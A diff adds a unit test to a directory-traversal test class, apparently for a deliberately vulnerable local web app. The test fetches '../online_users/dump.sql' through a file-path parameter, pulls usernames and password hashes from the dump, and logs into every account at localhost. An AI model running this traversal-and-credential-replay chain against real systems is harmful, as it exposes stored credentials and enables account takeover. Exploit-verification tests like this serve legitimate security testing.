@@ -111,6 +111,25 @@ class TestDirectoryTraversal(unittest.TestCase):
         req = rq.post('http://localhost:6597/login', data=obj)
         self.assertEqual(200, req.status_code)
 
+    def test_get_all_dumps(self):
+        filename = '../online_users/dump.sql'
+        url, cookies = send_file_appointment(filename)
+
+        download = rq.get(url, allow_redirects=True, cookies=cookies)
+        sql_string = download.content[27:-2].decode('ascii')
+        user_list = tuple_string_to_list(sql_string)
+        for i in user_list:
+            user = (i[1])[1:-1]
+            hash = (i[2])[2:]
+            obj = {
+                'username': user,
+                'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
+                'login': 'signin'
+            }
+            req = rq.post('http://localhost:6597/login', data=obj)
+            self.assertEqual(200, req.status_code)
+        print("tested %d user credentials" % len(user_list))
+
 
 class TestSimpleLogin(unittest.TestCase):
     def test_create_user(self):
